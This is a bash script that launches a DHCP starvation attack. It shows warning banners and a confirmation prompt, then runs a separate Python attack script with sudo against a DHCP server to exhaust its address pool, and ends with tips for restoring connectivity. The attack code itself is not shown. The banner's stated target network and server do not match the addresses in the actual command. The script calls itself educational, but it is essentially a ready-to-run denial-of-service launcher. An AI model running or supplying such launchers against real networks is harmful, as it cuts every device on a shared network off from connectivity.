#!/bin/bash

# Get current IP of the interface
INTERFACE="wlp2s0"
CURRENT_IP=$(ip addr show $INTERFACE | grep "inet " | awk '{print $2}' | cut -d'/' -f1)

echo "=================================================================="
echo "                DHCP STARVATION ATTACK WARNING "
echo "=================================================================="
echo "[!] Current IP on $INTERFACE: $CURRENT_IP"
echo "[!] This attack will exhaust ALL available DHCP IPs"
echo "[!] YOUR LAPTOP AND ALL DEVICES will lose internet connectivity"
echo "[!] Devices that disconnect will NOT be able to reconnect"
echo "[!] Target Network: 192.168.0.0/24"
echo "[!] Target DHCP Server: 192.168.1.1"
echo "=================================================================="
echo ""
echo "  This is a DESTRUCTIVE network attack for educational purposes!"
echo "  Only run this on networks you own or have permission to test!"
echo ""
read -p " Are you absolutely sure you want to launch this attack? (yes/no): " confirm

if [[ $confirm != "yes" ]]; then
    echo " Attack cancelled - Smart choice for safety!"
    exit 0
fi

echo ""
echo " Preparing DHCP starvation attack..."
# echo " Attack will run for 300 seconds (5 minutes) with 50 threads"
# echo "⚡ Starting attack in 5 seconds... Press Ctrl+C to abort!"
echo ""
for i in {5..1}; do
    echo "   Starting in $i..."
    sleep 1
done

echo ""
echo " LAUNCHING DHCP STARVATION ATTACK!"
echo "=================================================================="

# Run the original attack command
sudo $(which python) dhcp_starvation.py -i wlp2s0 -s 172.20.10.1 -n 172.20.10.0/28 -t 5 -d 60


echo ""
echo "=================================================================="
echo " DHCP starvation attack completed!"
echo "🔧 To restore connectivity:"
echo "   - Restart your router/DHCP server"
echo "   - Wait for DHCP leases to expire"
echo "   - Manually release and renew IP addresses"
echo "=================================================================="
